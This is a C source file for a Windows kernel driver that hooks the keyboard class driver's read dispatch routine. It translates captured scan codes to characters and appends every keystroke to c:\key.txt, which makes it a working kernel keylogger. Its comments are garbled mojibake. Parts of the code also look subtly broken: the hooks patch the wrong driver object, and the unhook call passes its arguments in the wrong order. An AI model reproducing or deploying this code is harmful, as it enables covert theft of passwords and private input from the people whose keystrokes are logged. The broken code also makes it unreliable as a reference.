#include "KbdCap.h"
ULONG IsLoop = 1;
int		off = 0;
void kbddiskeyUnload(IN PDRIVER_OBJECT DriverObject);
NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp);
NTSTATUS KbdReadComplete(PDEVICE_OBJECT DeviceObject,PIRP Irp,PVOID Context);
void __stdcall print_keystroke(UCHAR sch,PDEVICE_OBJECT DeviceObject,USHORT Flag);
VOID PrintToFile(PDEVICE_OBJECT DeviceObject,PVOID Context);
NTSTATUS HookRead(IN PDRIVER_OBJECT DriverObject);
NTSTATUS UnHookRead(IN PDRIVER_OBJECT DriverObject);

#define KBD_DRIVER_NAME L"\\Driver\\Kbdclass"

#ifdef __cplusplus
extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath);
#endif

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING  RegistryPath)
{
	NTSTATUS status;
	
	status=HookRead(DriverObject);
	if(!NT_SUCCESS(status))
	{
		DbgPrint("MyAttach:can not get the kbd driver object\n");
		return STATUS_UNSUCCESSFUL;
	}
	DriverObject->DriverUnload=kbddiskeyUnload;

	return STATUS_SUCCESS;
}

void kbddiskeyUnload(IN PDRIVER_OBJECT DriverObject)
{
	IsLoop=0;
	UnHookRead(DriverObject);
}

NTSTATUS DispatchRead(IN PDEVICE_OBJECT pDeviceObject, IN PIRP Irp)
{
	PIO_STACK_LOCATION irpSp;
	irpSp=IoGetCurrentIrpStackLocation(Irp);
	irpSp->Control = SL_INVOKE_ON_SUCCESS|SL_INVOKE_ON_ERROR|SL_INVOKE_ON_CANCEL;

	irpSp->Context = irpSp->CompletionRoutine;
    irpSp->CompletionRoutine = (PIO_COMPLETION_ROUTINE)KbdReadComplete;
    DbgPrint("�����ûص�����.../n");
    KbdKeyCount++;
	return OldDispatchRead(pDeviceObject,Irp);  

}

NTSTATUS KbdReadComplete(PDEVICE_OBJECT DeviceObject,PIRP Irp,PVOID Context)
{
	PIO_STACK_LOCATION IrpSp;
	ULONG buf_len = 0;
	struct _KEYBOARD_INPUT_DATA *buf;
	size_t i;
	
	IrpSp = IoGetCurrentIrpStackLocation(Irp);

	//���ײ����������ɹ��Ļ�
	if(NT_SUCCESS(Irp->IoStatus.Status))
	{
		//������ݻ�����
		buf = (struct _KEYBOARD_INPUT_DATA*)Irp->AssociatedIrp.SystemBuffer;
		//��û�������KEY_BOARD_INPUT_DATA�ṹ�������
		buf_len = (Irp->IoStatus.Information)/sizeof(KEYBOARD_INPUT_DATA);

		//���δ�ӡÿ���ṹ���е�����
		for(i=0;i<buf_len;i++)
		{
			DbgPrint("Flags:%d.\n",buf[i].Flags);
			//��ɨ����ת����ascii��
			print_keystroke(buf[i].MakeCode,DeviceObject,buf[i].Flags);
		}
	}

	//���һ�ΰ����Ĵ���
	KbdKeyCount--;
	
	if(Irp->PendingReturned)
	{
		//���ϴ���Penging��ʶ��
		IoMarkIrpPending(Irp);
	}
	return Irp->IoStatus.Status;
}

void __stdcall print_keystroke(UCHAR sch,PDEVICE_OBJECT DeviceObject,USHORT Flag)
{
	//����һ����������
	PIO_WORKITEM pWriteToFile;

	UCHAR	ch = 0;
	pKbd_Dev_Ext DevExt;
	DevExt = (pKbd_Dev_Ext)(DeviceObject->DeviceExtension);

	if (Flag == KEY_MAKE)	//make
	{
		switch (sch)
		{
		case 0x3A:
			kb_status ^= S_CAPS;
			break;

		case 0x2A:
		case 0x36:
			kb_status |= S_SHIFT;
			break;

		case 0x45:
			kb_status ^= S_NUM;
		}
		if ((sch < 0x47) || 
			((sch >= 0x47 && sch < 0x54) && (kb_status & S_NUM))) // Num Lock
		{
			if((kb_status & S_CAPS) && (kb_status & S_SHIFT)){
				KdPrint(("������caps��shift.\n"));
				off = 84*3;
			}else if(kb_status & S_CAPS){
				KdPrint(("������caps\n"));
				off = 84;
			}else if(kb_status & S_SHIFT){
				KdPrint(("������shift\n"));
				off = 84*2;
			}else{
				off = 0;
			}
			ch = asciiTbl[off+sch];
		}

	}
	else if(Flag == KEY_BREAK)		//break
	{
		if (sch == 0x2A || sch == 0x36){
			KdPrint(("�ɿ���Shift.\n"));
			kb_status &= ~S_SHIFT;
			off = 0;
		}
	}

	if (ch >= 0x20 && ch < 0x7F)
	{
		if(Flag == KEY_MAKE)
		{
			DbgPrint("ch:%C \n",ch);
			KdPrint(("off:%d.\n",off));
			DbgPrint((" "));
			//����һ����������
			pWriteToFile = IoAllocateWorkItem(DeviceObject);

			//������������PrintToFile�󶨺���뵽ϵͳ��������
			IoQueueWorkItem(
				pWriteToFile,
				PrintToFile,
				DelayedWorkQueue,
				NULL
				);
			DevExt->Data = ch;
		}
	}
}

VOID PrintToFile(PDEVICE_OBJECT DeviceObject,PVOID Context)
{
	HANDLE hFile;
	OBJECT_ATTRIBUTES FileObjAtt;
	IO_STATUS_BLOCK IoStatusBlock;
	UNICODE_STRING FilePath;
	NTSTATUS ntstatus;
	pKbd_Dev_Ext DevExt;
	
	DevExt = (pKbd_Dev_Ext)(DeviceObject->DeviceExtension);
	//�ļ�·��
	RtlInitUnicodeString(&FilePath,L"\\??\\c:\\key.txt");

	//��ʼ��ObjectAttribute
	InitializeObjectAttributes(
							   &FileObjAtt,
							   &FilePath,
							   OBJ_CASE_INSENSITIVE,
							   NULL,
							   NULL
							   );
	
	//�����ļ������������
	ntstatus = ZwCreateFile(
							&hFile,
						    FILE_APPEND_DATA,	//���ļ��Ľ�β��ʼд
							&FileObjAtt,
							&IoStatusBlock,
							NULL,
							FILE_ATTRIBUTE_NORMAL,
							0,
							FILE_OPEN_IF,		//��������򿪣����򴴽�
							FILE_SYNCHRONOUS_IO_NONALERT,
							NULL,
							0
							);

	if(!NT_SUCCESS(ntstatus))
	{
		KdPrint(("Create file error.\n"));
		ZwClose(hFile);
		return;
	}

	//����ȫ�ֱ�ʶ��Ϊ1
	if(IsLoop == 1)
	{
		//��ʼд�뵽�ļ�
		ntstatus = ZwWriteFile(
							   hFile,
							   NULL,
							   NULL,
							   NULL,
							   &IoStatusBlock,
							   &(DevExt->Data),
							   sizeof(UCHAR),
							   0,
							   NULL
							   );
		
		if(!NT_SUCCESS(ntstatus))
		{
			KdPrint(("Write file error.\n"));
			ZwClose(hFile);
		    return ;
		}
		ZwClose(hFile);
		return ;
	}
	else
	{
		ZwClose(hFile);
		return ;
	}
}

NTSTATUS HookRead(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING DriverName;
	PDEVICE_OBJECT KbdDriverObject = NULL;
	NTSTATUS status;

	RtlInitUnicodeString(&DriverName,KBD_DRIVER_NAME);
	status=ObReferenceObjectByName(
		&DriverName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		0,
		IoDriverObjectType,
		KernelMode,
		NULL,
		(PVOID *)&KbdDriverObject
		);
	if(!NT_SUCCESS(status))
	{
		DbgPrint("MyAttach:can not get the kbd driver object\n");
		return STATUS_UNSUCCESSFUL;
	}
	OldDispatchRead=DriverObject->MajorFunction[IRP_MJ_READ];
	InterlockedExchangePointer(&DriverObject->MajorFunction[IRP_MJ_READ],DispatchRead);
	ObDereferenceObject(DriverObject);
	return STATUS_SUCCESS;
}

NTSTATUS UnHookRead(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING DriverName;
	PDEVICE_OBJECT KbdDriverObject = NULL;
	NTSTATUS status;

	RtlInitUnicodeString(&DriverName,KBD_DRIVER_NAME);
	status=ObReferenceObjectByName(
		&DriverName,
		OBJ_CASE_INSENSITIVE,
		NULL,
		0,
		IoDriverObjectType,
		KernelMode,
		NULL,
		(PVOID *)&KbdDriverObject
		);
	if(!NT_SUCCESS(status))
	{
		DbgPrint("MyAttach:can not get the kbd driver object\n");
		return STATUS_UNSUCCESSFUL;
	}

	InterlockedExchangePointer(OldDispatchRead,&DriverObject->MajorFunction[IRP_MJ_READ]);
	ObDereferenceObject(DriverObject);
	return STATUS_SUCCESS;

}